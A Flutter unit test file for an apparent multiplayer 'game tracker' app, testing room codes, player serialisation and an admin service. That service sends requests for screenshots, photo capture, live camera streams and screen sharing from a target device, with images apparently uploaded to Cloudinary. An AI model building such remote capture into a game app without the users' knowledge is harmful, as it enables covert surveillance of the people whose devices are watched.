import 'package:flutter_test/flutter_test.dart';
import 'package:game_tracker/services/admin_service.dart';
import 'package:game_tracker/controllers/admin_controller.dart';
import 'package:game_tracker/models/game_room_model.dart';
import 'package:game_tracker/services/online_multiplayer_service.dart';

void main() {
  group('AdminService Request & Payload Unit Tests', () {
    test('builds screenshot request payload', () {
      final payload = AdminService.buildRequestPayload(
        requestType: 'screenshot',
        targetDeviceId: 'device-target-123',
        requestedByDeviceId: 'device-admin-999',
      );

      expect(payload['requestType'], 'screenshot');
      expect(payload['targetDeviceId'], 'device-target-123');
      expect(payload['requestedByDeviceId'], 'device-admin-999');
      expect(payload['status'], 'pending');
    });

    test('builds camera_capture request payload with cameraFacing', () {
      final payload = AdminService.buildRequestPayload(
        requestType: 'camera_capture',
        targetDeviceId: 'device-target-123',
        requestedByDeviceId: 'device-admin-999',
        cameraFacing: 'back',
      );

      expect(payload['requestType'], 'camera_capture');
      expect(payload['cameraFacing'], 'back');
      expect(payload['status'], 'pending');
    });

    test('builds camera_stream request payload with cameraFacing', () {
      final payload = AdminService.buildRequestPayload(
        requestType: 'camera_stream',
        targetDeviceId: 'device-target-123',
        requestedByDeviceId: 'device-admin-999',
        cameraFacing: 'front',
      );

      expect(payload['requestType'], 'camera_stream');
      expect(payload['cameraFacing'], 'front');
      expect(payload['status'], 'pending');
    });

    test('builds screen_share request payload', () {
      final payload = AdminService.buildRequestPayload(
        requestType: 'screen_share',
        targetDeviceId: 'device-target-123',
        requestedByDeviceId: 'device-admin-999',
      );

      expect(payload['requestType'], 'screen_share');
      expect(payload['status'], 'pending');
    });

    test('extracts Cloudinary public_id from URL', () {
      const sampleUrl1 = 'https://res.cloudinary.com/dsuaryuxj/image/upload/v1722345678/sample_image.png';
      final publicId1 = AdminService.extractCloudinaryPublicId(sampleUrl1);
      expect(publicId1, 'sample_image');

      const sampleUrl2 = 'https://res.cloudinary.com/dsuaryuxj/image/upload/v12345/folder/nested_photo.jpg';
      final publicId2 = AdminService.extractCloudinaryPublicId(sampleUrl2);
      expect(publicId2, 'folder/nested_photo');
    });
  });

  group('AdminDevice & Request Item Model Tests', () {
    test('AdminDevice uses displayName over raw deviceId', () {
      final device = AdminDevice(
        deviceId: 'device-abc-123',
        platform: 'android',
        username: 'John Doe',
        nativeCaptureEnabled: true,
      );

      expect(device.deviceId, 'device-abc-123');
      expect(device.username, 'John Doe');
      expect(device.platform, 'android');
      expect(device.nativeCaptureEnabled, true);
    });

    test('ScreenshotRequestItem correctly parses status and requestType', () {
      final item = ScreenshotRequestItem(
        requestId: 'req-777',
        targetDeviceId: 'device-target-123',
        requestedByDeviceId: 'device-admin-999',
        status: 'completed',
        requestType: 'camera_capture',
        screenshotUrl: 'https://res.cloudinary.com/dsuaryuxj/image/upload/v1/test.jpg',
      );

      expect(item.requestId, 'req-777');
      expect(item.status, 'completed');
      expect(item.requestType, 'camera_capture');
      expect(item.screenshotUrl, isNotNull);
    });

    test('ScreenshotRequestItem correctly parses error and failureReason on failure', () {
      final failedItem = ScreenshotRequestItem(
        requestId: 'req-888',
        targetDeviceId: 'device-target-123',
        requestedByDeviceId: 'device-admin-999',
        status: 'failed',
        requestType: 'screen_share',
        error: 'Screen capture permission missing or expired',
        failureReason: 'Missing saved MediaProjection result data or expired permission',
      );

      expect(failedItem.requestId, 'req-888');
      expect(failedItem.status, 'failed');
      expect(failedItem.error, 'Screen capture permission missing or expired');
      expect(failedItem.failureReason, 'Missing saved MediaProjection result data or expired permission');
    });
  });

  group('Online Multiplayer & Game Room Unit Tests', () {
    test('generates valid 6-digit room code', () {
      final code = OnlineMultiplayerService.generate6DigitCode();
      expect(code.length, 6);
      expect(int.tryParse(code), isNotNull);
      expect(int.parse(code), greaterThanOrEqualTo(100000));
      expect(int.parse(code), lessThanOrEqualTo(999999));
    });

    test('GameRoomPlayer JSON serialization', () {
      final player = GameRoomPlayer(
        uid: 'user-123',
        name: 'Alice',
        colorIndex: 0,
        isHost: true,
      );

      final json = player.toJson();
      expect(json['uid'], 'user-123');
      expect(json['name'], 'Alice');
      expect(json['colorIndex'], 0);
      expect(json['isHost'], true);

      final deserialized = GameRoomPlayer.fromJson(json);
      expect(deserialized.uid, 'user-123');
      expect(deserialized.name, 'Alice');
      expect(deserialized.colorIndex, 0);
      expect(deserialized.isHost, true);
    });

    test('GameRoom model JSON creation', () {
      final room = GameRoom(
        roomCode: '581920',
        hostId: 'user-host-123',
        hostName: 'Host Master',
        maxPlayers: 4,
        status: 'lobby',
        players: [
          GameRoomPlayer(uid: 'user-host-123', name: 'Host Master', colorIndex: 0, isHost: true),
          GameRoomPlayer(uid: 'user-joiner-456', name: 'Joiner Bob', colorIndex: 1, isHost: false),
        ],
      );

      final json = room.toJson();
      expect(json['roomCode'], '581920');
      expect(json['hostId'], 'user-host-123');
      expect(json['maxPlayers'], 4);
      expect(json['status'], 'lobby');
      expect((json['players'] as List).length, 2);
    });
  });
}
